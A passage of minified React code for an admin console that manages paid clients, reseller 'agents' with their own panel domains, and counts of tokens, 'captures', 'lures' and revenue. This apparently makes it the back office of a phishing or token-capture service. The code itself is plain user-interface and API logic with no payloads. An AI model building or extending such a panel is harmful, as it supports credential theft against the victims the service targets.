      let e = await ac({
        username: n,
        password: i,
        display_name: o || void 0,
        subscription_days: parseInt(c) || 30,
      });
      e.success
        ? (f(`Client ${e.username} created`, `success`), t())
        : f(e.error || `Failed`, `error`);
    } catch (e) {
      f(e.message || `Failed`, `error`);
    } finally {
      d(!1);
    }
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Create Client`,
    onClose: e,
    width: `max-w-md`,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-4`,
      children: [
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Username`,
            }),
            (0, R.jsx)(`input`, {
              type: `text`,
              value: n,
              onChange: (e) => r(e.target.value),
              placeholder: `client_username`,
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Password`,
            }),
            (0, R.jsx)(`input`, {
              type: `text`,
              value: i,
              onChange: (e) => a(e.target.value),
              placeholder: `Strong password`,
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Display Name (optional)`,
            }),
            (0, R.jsx)(`input`, {
              type: `text`,
              value: o,
              onChange: (e) => s(e.target.value),
              placeholder: `Display name`,
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Subscription (days)`,
            }),
            (0, R.jsx)(`input`, {
              type: `number`,
              value: c,
              onChange: (e) => l(e.target.value),
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          className: `flex gap-2 pt-2`,
          children: [
            (0, R.jsx)(V, {
              onClick: p,
              disabled: u,
              className: `flex-1`,
              children: u ? `Creating...` : `Create Client`,
            }),
            (0, R.jsx)(V, {
              variant: `secondary`,
              onClick: e,
              className: `flex-1`,
              children: `Cancel`,
            }),
          ],
        }),
      ],
    }),
  });
}
function fc({ client: e, onClose: t, onSaved: n }) {
  let [r, i] = (0, _.useState)(e.display_name || ``),
    [a, o] = (0, _.useState)(``),
    [s, c] = (0, _.useState)(!1),
    l = z((e) => e.add);
  async function u() {
    let i = {};
    if (
      (r !== (e.display_name || ``) && (i.display_name = r),
      a && (i.password = a),
      Object.keys(i).length === 0)
    ) {
      t();
      return;
    }
    c(!0);
    try {
      (await oc(e.id, i), l(`Client updated`, `success`), n());
    } catch {
      l(`Update failed`, `error`);
    } finally {
      c(!1);
    }
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Edit — ${e.username}`,
    onClose: t,
    width: `max-w-md`,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-4`,
      children: [
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Display Name`,
            }),
            (0, R.jsx)(`input`, {
              type: `text`,
              value: r,
              onChange: (e) => i(e.target.value),
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `New Password (leave blank to keep)`,
            }),
            (0, R.jsx)(`input`, {
              type: `text`,
              value: a,
              onChange: (e) => o(e.target.value),
              placeholder: `Leave blank to keep current`,
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          className: `flex gap-2 pt-2`,
          children: [
            (0, R.jsx)(V, {
              onClick: u,
              disabled: s,
              className: `flex-1`,
              children: s ? `Saving...` : `Save Changes`,
            }),
            (0, R.jsx)(V, {
              variant: `secondary`,
              onClick: t,
              className: `flex-1`,
              children: `Cancel`,
            }),
          ],
        }),
      ],
    }),
  });
}
async function pc() {
  return P(`/admin/overview`);
}
async function mc() {
  return P(`/admin/users`);
}
async function hc(e) {
  return P(`/admin/users/${e}/delete`, { method: `POST` });
}
async function gc(e, t) {
  return P(`/admin/users/${e}/reset-password`, {
    method: `POST`,
    body: JSON.stringify({ password: t }),
  });
}
async function _c(e) {
  return P(`/admin/users/create`, { method: `POST`, body: JSON.stringify(e) });
}
async function vc() {
  return P(`/admin/agents`);
}
async function yc(e) {
  return P(`/admin/agents/create`, { method: `POST`, body: JSON.stringify(e) });
}
async function bc(e) {
  return P(`/admin/agents/${e}`);
}
async function xc(e, t) {
  return P(`/admin/agents/${e}/update`, {
    method: `POST`,
    body: JSON.stringify(t),
  });
}
async function Sc(e) {
  return P(`/admin/agents/${e}/suspend`, { method: `POST` });
}
async function Cc(e) {
  return P(`/admin/agents/${e}/resume`, { method: `POST` });
}
async function wc(e) {
  return P(`/admin/agents/${e}/delete`, { method: `POST` });
}
function Tc() {
  let [e, t] = (0, _.useState)(null),
    [n, r] = (0, _.useState)(!0);
  return (
    (0, _.useEffect)(() => {
      pc()
        .then(t)
        .catch(() => {})
        .finally(() => r(!1));
    }, []),
    n
      ? (0, R.jsx)(`div`, {
          className: `text-text-muted text-sm py-12 text-center`,
          children: `Loading...`,
        })
      : (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`h1`, {
              className: `text-lg font-bold tracking-wider uppercase mb-6`,
              children: `Admin Dashboard`,
            }),
            (0, R.jsxs)(`div`, {
              className: `grid grid-cols-2 lg:grid-cols-4 gap-3 mb-6`,
              children: [
                (0, R.jsx)(B, {
                  label: `Total Users`,
                  value: e?.total_users ?? 0,
                  icon: (0, R.jsx)(Ui, {
                    size: 18,
                    className: `text-text-muted`,
                  }),
                }),
                (0, R.jsx)(B, {
                  label: `Active Users`,
                  value: e?.active_users ?? 0,
                  accent: `active`,
                  icon: (0, R.jsx)(Ui, { size: 18, className: `text-active` }),
                }),
                (0, R.jsx)(B, {
                  label: `All Tokens`,
                  value: e?.total_tokens ?? 0,
                  icon: (0, R.jsx)(ti, {
                    size: 18,
                    className: `text-text-muted`,
                  }),
                }),
                (0, R.jsx)(B, {
                  label: `All Captures`,
                  value: e?.total_captures ?? 0,
                  icon: (0, R.jsx)(Pi, {
                    size: 18,
                    className: `text-text-muted`,
                  }),
                }),
              ],
            }),
            (0, R.jsxs)(`div`, {
              className: `grid grid-cols-2 lg:grid-cols-3 gap-3`,
              children: [
                (0, R.jsx)(B, {
                  label: `Active Tokens`,
                  value: e?.active_tokens ?? 0,
                  accent: `active`,
                }),
                (0, R.jsx)(B, {
                  label: `Total Lures`,
                  value: e?.total_lures ?? 0,
                  icon: (0, R.jsx)(ai, {
                    size: 18,
                    className: `text-text-muted`,
                  }),
                }),
                e?.total_revenue !== void 0 &&
                  (0, R.jsx)(B, {
                    label: `Revenue`,
                    value: `$${e.total_revenue}`,
                  }),
              ],
            }),
          ],
        })
  );
}
function Ec() {
  let [e, t] = (0, _.useState)([]),
    [n, r] = (0, _.useState)(!0),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)(null),
    [c, l] = (0, _.useState)(``),
    [u, d] = (0, _.useState)(!1),
    f = z((e) => e.add);
  function p() {
    (r(!0),
      mc()
        .then(t)
        .catch(() => f(`Failed to load users`, `error`))
        .finally(() => r(!1)));
  }
  (0, _.useEffect)(p, []);
  async function m(e) {
    if (confirm(`Delete user "${e.username}"? This cannot be undone.`))
      try {
        (await hc(e.id), f(`User ${e.username} deleted`, `success`), p());
      } catch {
        f(`Delete failed`, `error`);
      }
  }
  async function h() {
    if (!o || c.length < 6) {
      f(`Password must be at least 6 characters`, `error`);
      return;
    }
    try {
      (await gc(o.id, c),
        f(`Password reset for ${o.username}`, `success`),
        s(null),
        l(``));
    } catch {
      f(`Reset failed`, `error`);
    }
  }
  let g = e.filter((e) => {
    if (!i) return !0;
    let t = i.toLowerCase();
    return (
      e.username.toLowerCase().includes(t) ||
      e.role.toLowerCase().includes(t) ||
      e.status?.toLowerCase().includes(t)
    );
  });
  return n
    ? (0, R.jsx)(`div`, {
        className: `text-text-muted text-sm py-12 text-center`,
        children: `Loading...`,
      })
    : (0, R.jsxs)(`div`, {
        children: [
          (0, R.jsxs)(`div`, {
            className: `flex items-center justify-between mb-5`,
            children: [
              (0, R.jsxs)(`div`, {
                children: [
                  (0, R.jsx)(`h1`, {
                    className: `text-lg font-bold tracking-wider uppercase`,
                    children: `Manage Clients`,
                  }),
                  (0, R.jsxs)(`p`, {
                    className: `text-xs text-text-muted mt-1`,
                    children: [e.length, ` users total`],
                  }),
                ],
              }),
              (0, R.jsx)(V, {
                onClick: () => d(!0),
                children: (0, R.jsxs)(`span`, {
                  className: `flex items-center gap-1.5`,
                  children: [(0, R.jsx)(_i, { size: 14 }), ` New Client`],
                }),
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `mb-4 relative`,
            children: [
              (0, R.jsx)(xi, {
                size: 14,
                className: `absolute left-3 top-1/2 -translate-y-1/2 text-text-muted`,
              }),
              (0, R.jsx)(`input`, {
                type: `text`,
                placeholder: `Search by username, role, or status...`,
                value: i,
                onChange: (e) => a(e.target.value),
                className: `w-full bg-surface border border-border text-text pl-9 pr-3 py-2.5 text-sm focus:outline-none focus:border-border-light transition-colors placeholder:text-text-muted`,
              }),
            ],
          }),
          (0, R.jsx)(`div`, {
            className: `bg-surface border border-border overflow-x-auto`,
            children: (0, R.jsxs)(`table`, {
              className: `w-full text-sm`,
              children: [
                (0, R.jsx)(`thead`, {
                  children: (0, R.jsxs)(`tr`, {
                    className: `border-b border-border`,
                    children: [
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `#`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Username`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Role`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Status`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Plan`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-center text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Tokens`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-center text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Captures`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Joined`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Actions`,
                      }),
                    ],
                  }),
                }),
                (0, R.jsx)(`tbody`, {
                  children:
                    g.length === 0
                      ? (0, R.jsx)(`tr`, {
                          children: (0, R.jsx)(`td`, {
                            colSpan: 9,
                            className: `text-center text-text-muted py-12`,
                            children: `No users found`,
                          }),
                        })
                      : g.map((e, t) =>
                          (0, R.jsxs)(
                            `tr`,
                            {
                              className: `border-b border-border/40 hover:bg-slate-50 transition-colors`,
                              children: [
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[11px] text-text-muted`,
                                  children: t + 1,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[13px] font-semibold`,
                                  children: e.username,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3`,
                                  children: (0, R.jsx)(la, {
                                    status: `default`,
                                    label: e.role,
                                  }),
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3`,
                                  children: (0, R.jsx)(la, {
                                    status: e.status,
                                  }),
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[13px] text-text-secondary`,
                                  children: e.plan_tier ?? `—`,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[13px] text-text text-center`,
                                  children: e.token_count ?? 0,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[13px] text-text font-semibold text-center`,
                                  children: e.capture_count ?? 0,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[11px] text-text-muted whitespace-nowrap`,
                                  children: new Date(
                                    e.created_at,
                                  ).toLocaleDateString(),
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2 px-3`,
                                  children: (0, R.jsxs)(`div`, {
                                    className: `flex gap-1`,
                                    children: [
                                      (0, R.jsx)(Oc, {
                                        label: `Reset`,
                                        icon: (0, R.jsx)(ti, { size: 12 }),
                                        onClick: () => {
                                          (s(e), l(``));
                                        },
                                        color: `text-text-secondary hover:text-warning hover:bg-warning/10`,
                                      }),
                                      (0, R.jsx)(Oc, {
                                        label: `Delete`,
                                        icon: (0, R.jsx)(I, { size: 12 }),
                                        onClick: () => m(e),
                                        color: `text-text-secondary hover:text-danger hover:bg-danger/10`,
                                      }),
                                    ],
                                  }),
                                }),
                              ],
                            },
                            e.id,
                          ),
                        ),
                }),
              ],
            }),
          }),
          (0, R.jsx)(Sa, {
            open: !!o,
            onClose: () => s(null),
            title: `Reset Password`,
            children: (0, R.jsxs)(`div`, {
              className: `space-y-4`,
              children: [
                (0, R.jsxs)(`p`, {
                  className: `text-sm text-text-secondary`,
                  children: [
                    `Reset password for `,
                    (0, R.jsx)(`span`, {
                      className: `text-text font-semibold`,
                      children: o?.username,
                    }),
                  ],
                }),
                (0, R.jsx)(H, {
                  label: `New Password`,
                  type: `password`,
                  value: c,
                  onChange: (e) => l(e.target.value),
                  placeholder: `Min 6 characters`,
                  autoFocus: !0,
                }),
                (0, R.jsxs)(`div`, {
                  className: `flex gap-2`,
                  children: [
                    (0, R.jsx)(V, {
                      onClick: h,
                      className: `flex-1`,
                      children: `Reset`,
                    }),
                    (0, R.jsx)(V, {
                      variant: `secondary`,
                      onClick: () => s(null),
                      className: `flex-1`,
                      children: `Cancel`,
                    }),
                  ],
                }),
              ],
            }),
          }),
          u &&
            (0, R.jsx)(Dc, {
              onClose: () => d(!1),
              onCreated: () => {
                (d(!1), p());
              },
            }),
        ],
      });
}
function Dc({ onClose: e, onCreated: t }) {
  let [n, r] = (0, _.useState)(``),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)(``),
    [c, l] = (0, _.useState)(`30`),
    [u, d] = (0, _.useState)(`standard`),
    [f, p] = (0, _.useState)(!1),
    m = z((e) => e.add);
  async function h() {
    if (!n || n.length < 3) {
      m(`Username must be at least 3 characters`, `error`);
      return;
    }
    if (!i || i.length < 6) {
      m(`Password must be at least 6 characters`, `error`);
      return;
    }
    p(!0);
    try {
      let e = await _c({
        username: n,
        password: i,
        display_name: o || n,
        role: `client`,
        plan_tier: u,
        subscription_days: parseInt(c) || 30,
      });
      e.success
        ? (m(`Client "${e.username}" created`, `success`), t())
        : m(e.error || `Failed to create`, `error`);
    } catch (e) {
      m(e.message || `Creation failed`, `error`);
    } finally {
      p(!1);
    }
  }
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Create Client`,
    onClose: e,
    width: `max-w-md`,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-4`,
      children: [
        (0, R.jsx)(H, {
          label: `Username`,
          value: n,
          onChange: (e) => r(e.target.value),
          placeholder: `client_username`,
          autoFocus: !0,
        }),
        (0, R.jsx)(H, {
          label: `Password`,
          value: i,
          onChange: (e) => a(e.target.value),
          placeholder: `Strong password (min 6 chars)`,
        }),
        (0, R.jsx)(H, {
          label: `Display Name`,
          value: o,
          onChange: (e) => s(e.target.value),
          placeholder: `Optional display name`,
        }),
        (0, R.jsx)(H, {
          label: `Subscription (days)`,
          type: `number`,
          value: c,
          onChange: (e) => l(e.target.value),
        }),
        (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsx)(`label`, {
              className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
              children: `Plan`,
            }),
            (0, R.jsxs)(`select`, {
              value: u,
              onChange: (e) => d(e.target.value),
              className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light`,
              children: [
                (0, R.jsx)(`option`, {
                  value: `standard`,
                  children: `Standard`,
                }),
                (0, R.jsx)(`option`, { value: `pro`, children: `Pro` }),
              ],
            }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          className: `flex gap-2 pt-2`,
          children: [
            (0, R.jsx)(V, {
              onClick: h,
              disabled: f,
              className: `flex-1`,
              children: f ? `Creating...` : `Create Client`,
            }),
            (0, R.jsx)(V, {
              variant: `secondary`,
              onClick: e,
              className: `flex-1`,
              children: `Cancel`,
            }),
          ],
        }),
      ],
    }),
  });
}
function Oc({ label: e, icon: t, onClick: n, color: r }) {
  return (0, R.jsxs)(`button`, {
    onClick: n,
    className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider transition-colors cursor-pointer ${r}`,
    children: [t, (0, R.jsx)(`span`, { children: e })],
  });
}
var kc = [
  `crimson`,
  `emerald`,
  `ocean`,
  `amber`,
  `violet`,
  `slate`,
  `midnight`,
  `default`,
];
function Ac() {
  let [e, t] = (0, _.useState)([]),
    [n, r] = (0, _.useState)(!0),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)(!1),
    [c, l] = (0, _.useState)(null),
    [u, d] = (0, _.useState)(null),
    [f, p] = (0, _.useState)(!1),
    [m, h] = (0, _.useState)(null),
    g = z((e) => e.add),
    [v, y] = (0, _.useState)({
      username: ``,
      password: ``,
      slug: ``,
      panel_name: ``,
      theme: `crimson`,
      cost_per_client: `50`,
      max_free_clients: `2`,
    }),
    [b, x] = (0, _.useState)({
      cost_per_client: ``,
      max_free_clients: ``,
      balance: ``,
      notes: ``,
    });
  function S() {
    (r(!0),
      vc()
        .then(t)
        .catch(() => g(`Failed to load agents`, `error`))
        .finally(() => r(!1)));
  }
  (0, _.useEffect)(S, []);
  async function C(e) {
    if (c === e) {
      (l(null), d(null));
      return;
    }
    (l(e), p(!0));
    try {
      d(await bc(e));
    } catch {
      g(`Failed to load agent details`, `error`);
    } finally {
      p(!1);
    }
  }
  async function w() {
    let { username: e, password: t, slug: n } = v;
    if (e.length < 3)
      return g(`Username must be at least 3 characters`, `error`);
    if (t.length < 6)
      return g(`Password must be at least 6 characters`, `error`);
    if (n.length < 2 || !/^[a-z0-9][a-z0-9-]*$/.test(n))
      return g(
        `Slug must be 2+ chars, lowercase alphanumeric/hyphens`,
        `error`,
      );
    try {
      let e = await yc({
        ...v,
        cost_per_client: parseFloat(v.cost_per_client) || 50,
        max_free_clients: parseInt(v.max_free_clients) || 2,
      });
      (g(`Agent "${e.slug}" created at ${e.domain}`, `success`),
        s(!1),
        y({
          username: ``,
          password: ``,
          slug: ``,
          panel_name: ``,
          theme: `crimson`,
          cost_per_client: `50`,
          max_free_clients: `2`,
        }),
        S());
    } catch (e) {
      g(e.message || `Create failed`, `error`);
    }
  }
  async function ee(e) {
    if (confirm(`Suspend agent "${e.slug}"? Their panel will go offline.`))
      try {
        (await Sc(e.slug), g(`Agent ${e.slug} suspended`, `success`), S());
      } catch {
        g(`Suspend failed`, `error`);
      }
  }
  async function T(e) {
    try {
      (await Cc(e.slug), g(`Agent ${e.slug} resumed`, `success`), S());
    } catch {
      g(`Resume failed`, `error`);
    }
  }
  async function E(e) {
    if (
      confirm(
        `DELETE agent "${e.slug}"? This removes their service, database, and all client data. Cannot be undone.`,
      )
    )
      try {
        (await wc(e.slug),
          g(`Agent ${e.slug} deleted`, `success`),
          c === e.slug && (l(null), d(null)),
          S());
      } catch {
        g(`Delete failed`, `error`);
      }
  }
  function D(e) {
    (h(e),
      x({
        cost_per_client: String(e.cost_per_client ?? 50),
        max_free_clients: String(e.max_free_clients ?? 2),
        balance: String(e.balance ?? 0),
        notes: e.notes ?? ``,
      }));
  }
  async function te() {
    if (m)
      try {
        (await xc(m.slug, {
          cost_per_client: parseFloat(b.cost_per_client) || void 0,
          max_free_clients: parseInt(b.max_free_clients) || void 0,
          balance: parseFloat(b.balance) || void 0,
          notes: b.notes || void 0,
        }),
          g(`Agent ${m.slug} updated`, `success`),
          h(null),
          S());
      } catch {
        g(`Update failed`, `error`);
      }
  }
  function ne(e) {
    (navigator.clipboard.writeText(e), g(`URL copied`, `success`));
  }
  let O = e.filter((e) => {
    if (!i) return !0;
    let t = i.toLowerCase();
    return (
      e.slug.toLowerCase().includes(t) ||
      e.panel_name.toLowerCase().includes(t) ||
      e.domain?.toLowerCase().includes(t) ||
      e.username?.toLowerCase().includes(t)
    );
  });
  return n
    ? (0, R.jsx)(`div`, {
        className: `text-text-muted text-sm py-12 text-center`,
        children: `Loading...`,
      })
    : (0, R.jsxs)(`div`, {
        children: [
          (0, R.jsxs)(`div`, {
            className: `flex items-center justify-between mb-5`,
            children: [
              (0, R.jsxs)(`div`, {
                children: [
                  (0, R.jsx)(`h1`, {
                    className: `text-lg font-bold tracking-wider uppercase`,
                    children: `Deployed Agents`,
                  }),
                  (0, R.jsxs)(`p`, {
                    className: `text-xs text-text-muted mt-1`,
                    children: [e.length, ` agents total`],
                  }),
                ],
              }),
              (0, R.jsx)(V, {
                size: `sm`,
                onClick: () => s(!0),
                children: (0, R.jsxs)(`span`, {
                  className: `flex items-center gap-1.5`,
                  children: [(0, R.jsx)(_i, { size: 13 }), ` Deploy Agent`],
                }),
              }),
            ],
          }),
          (0, R.jsxs)(`div`, {
            className: `mb-4 relative`,
            children: [
              (0, R.jsx)(xi, {
                size: 14,
                className: `absolute left-3 top-1/2 -translate-y-1/2 text-text-muted`,
              }),
              (0, R.jsx)(`input`, {
                type: `text`,
                placeholder: `Search by slug, name, or domain...`,
                value: i,
                onChange: (e) => a(e.target.value),
                className: `w-full bg-surface border border-border text-text pl-9 pr-3 py-2.5 text-sm focus:outline-none focus:border-border-light transition-colors placeholder:text-text-muted`,
              }),
            ],
          }),
          (0, R.jsx)(`div`, {
            className: `bg-surface border border-border overflow-x-auto`,
            children: (0, R.jsxs)(`table`, {
              className: `w-full text-sm`,
              children: [
                (0, R.jsx)(`thead`, {
                  children: (0, R.jsxs)(`tr`, {
                    className: `border-b border-border`,
                    children: [
                      (0, R.jsx)(jc, {}),
                      (0, R.jsx)(jc, { children: `Slug` }),
                      (0, R.jsx)(jc, { children: `Panel Name` }),
                      (0, R.jsx)(jc, { children: `Domain` }),
                      (0, R.jsx)(jc, { children: `Status` }),
                      (0, R.jsx)(jc, { children: `Service` }),
                      (0, R.jsx)(jc, { center: !0, children: `Clients` }),
                      (0, R.jsx)(jc, { center: !0, children: `Balance` }),
                      (0, R.jsx)(jc, { children: `Actions` }),
                    ],
                  }),
                }),
                (0, R.jsx)(`tbody`, {
                  children:
                    O.length === 0
                      ? (0, R.jsx)(`tr`, {
                          children: (0, R.jsx)(`td`, {
                            colSpan: 9,
                            className: `text-center text-text-muted py-12`,
                            children: `No agents found`,
                          }),
                        })
                      : O.map((e) =>
                          (0, R.jsx)(
                            Nc,
                            {
                              agent: e,
                              expanded: c === e.slug,
                              detail: c === e.slug ? u : null,
                              detailLoading: c === e.slug && f,
                              onToggle: () => C(e.slug),
                              onSuspend: () => ee(e),
                              onResume: () => T(e),
                              onDelete: () => E(e),
                              onEdit: () => D(e),
                              onCopyUrl: () =>
                                ne(e.url || `https://${e.domain}`),
                            },
                            e.slug,
                          ),
                        ),
                }),
              ],
            }),
          }),
          (0, R.jsx)(Sa, {
            open: o,
            onClose: () => s(!1),
            title: `Deploy New Agent`,
            width: `max-w-lg`,
            children: (0, R.jsxs)(`div`, {
              className: `space-y-3`,
              children: [
                (0, R.jsxs)(`div`, {
                  className: `grid grid-cols-2 gap-3`,
                  children: [
                    (0, R.jsx)(H, {
                      label: `Username`,
                      value: v.username,
                      onChange: (e) => y({ ...v, username: e.target.value }),
                      placeholder: `agent_username`,
                      autoFocus: !0,
                    }),
                    (0, R.jsx)(H, {
                      label: `Password`,
                      type: `password`,
                      value: v.password,
                      onChange: (e) => y({ ...v, password: e.target.value }),
                      placeholder: `Min 6 chars`,
                    }),
                  ],
                }),
                (0, R.jsxs)(`div`, {
                  className: `grid grid-cols-2 gap-3`,
                  children: [
                    (0, R.jsx)(H, {
                      label: `Slug`,
                      value: v.slug,
                      onChange: (e) =>
                        y({
                          ...v,
                          slug: e.target.value
                            .toLowerCase()
                            .replace(/[^a-z0-9-]/g, ``),
                        }),
                      placeholder: `my-agent`,
                    }),
                    (0, R.jsx)(H, {
                      label: `Panel Name`,
                      value: v.panel_name,
                      onChange: (e) => y({ ...v, panel_name: e.target.value }),
                      placeholder: `My Panel`,
                    }),
                  ],
                }),
                (0, R.jsxs)(`div`, {
                  className: `grid grid-cols-3 gap-3`,
                  children: [
                    (0, R.jsx)(xa, {
                      label: `Theme`,
                      value: v.theme,
                      onChange: (e) => y({ ...v, theme: e.target.value }),
                      children: kc.map((e) =>
                        (0, R.jsx)(`option`, { value: e, children: e }, e),
                      ),
                    }),
                    (0, R.jsx)(H, {
                      label: `Cost / Client`,
                      type: `number`,
                      value: v.cost_per_client,
                      onChange: (e) =>
                        y({ ...v, cost_per_client: e.target.value }),
                    }),
                    (0, R.jsx)(H, {
                      label: `Free Clients`,
                      type: `number`,
                      value: v.max_free_clients,
                      onChange: (e) =>
                        y({ ...v, max_free_clients: e.target.value }),
                    }),
                  ],
                }),
                (0, R.jsxs)(`div`, {
                  className: `flex gap-2 pt-2`,
                  children: [
                    (0, R.jsx)(V, {
                      onClick: w,
                      className: `flex-1`,
                      children: `Deploy`,
                    }),
                    (0, R.jsx)(V, {
                      variant: `secondary`,
                      onClick: () => s(!1),
                      className: `flex-1`,
                      children: `Cancel`,
                    }),
                  ],
                }),
              ],
            }),
          }),
          (0, R.jsx)(Sa, {
            open: !!m,
            onClose: () => h(null),
            title: `Edit Agent: ${m?.slug ?? ``}`,
            children: (0, R.jsxs)(`div`, {
              className: `space-y-3`,
              children: [
                (0, R.jsxs)(`div`, {
                  className: `grid grid-cols-2 gap-3`,
                  children: [
                    (0, R.jsx)(H, {
                      label: `Cost / Client`,
                      type: `number`,
                      value: b.cost_per_client,
                      onChange: (e) =>
                        x({ ...b, cost_per_client: e.target.value }),
                    }),
                    (0, R.jsx)(H, {
                      label: `Free Clients`,
                      type: `number`,
                      value: b.max_free_clients,
                      onChange: (e) =>
                        x({ ...b, max_free_clients: e.target.value }),
                    }),
                  ],
                }),
                (0, R.jsx)(H, {
                  label: `Balance`,
                  type: `number`,
                  value: b.balance,
                  onChange: (e) => x({ ...b, balance: e.target.value }),
                }),
                (0, R.jsxs)(`div`, {
                  className: `w-full`,
                  children: [
                    (0, R.jsx)(`label`, {
                      className: `block text-[10px] text-text-muted uppercase tracking-widest mb-1.5`,
                      children: `Notes`,
                    }),
                    (0, R.jsx)(`textarea`, {
                      value: b.notes,
                      onChange: (e) => x({ ...b, notes: e.target.value }),
                      rows: 3,
                      maxLength: 1e3,
                      className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm focus:outline-none focus:border-border-light transition-colors placeholder:text-text-muted resize-none`,
                      placeholder: `Internal notes...`,
                    }),
                  ],
                }),
                (0, R.jsxs)(`div`, {
                  className: `flex gap-2 pt-1`,
                  children: [
                    (0, R.jsx)(V, {
                      onClick: te,
                      className: `flex-1`,
                      children: `Save`,
                    }),
                    (0, R.jsx)(V, {
                      variant: `secondary`,
                      onClick: () => h(null),
                      className: `flex-1`,
                      children: `Cancel`,
                    }),
                  ],
                }),
              ],
            }),
          }),
        ],
      });
}
function jc({ children: e, center: t }) {
  return (0, R.jsx)(`th`, {
    className: `${t ? `text-center` : `text-left`} text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
    children: e,
  });
}
function Mc({ label: e, icon: t, onClick: n, color: r }) {
  return (0, R.jsxs)(`button`, {
    onClick: (e) => {
      (e.stopPropagation(), n());
    },
    className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider transition-colors cursor-pointer ${r}`,
    children: [t, (0, R.jsx)(`span`, { children: e })],
  });
}
function Nc({
  agent: e,
  expanded: t,
  detail: n,
  detailLoading: r,
  onToggle: i,
  onSuspend: a,
  onResume: o,
  onDelete: s,
  onEdit: c,
  onCopyUrl: l,
}) {
  let u = e.status === `suspended`,
    d = e.service_status === `active`;
  return (0, R.jsxs)(R.Fragment, {
    children: [
      (0, R.jsxs)(`tr`, {
        className: `border-b border-border/40 hover:bg-slate-50 transition-colors cursor-pointer`,
        onClick: i,
        children: [
          (0, R.jsx)(`td`, {
            className: `py-2.5 px-3 w-6`,
            children: t
              ? (0, R.jsx)(Mr, { size: 13, className: `text-text-muted` })
              : (0, R.jsx)(Nr, { size: 13, className: `text-text-muted` }),
          }),
          (0, R.jsx)(`td`, {
            className: `py-2.5 px-3 text-[13px] font-semibold`,
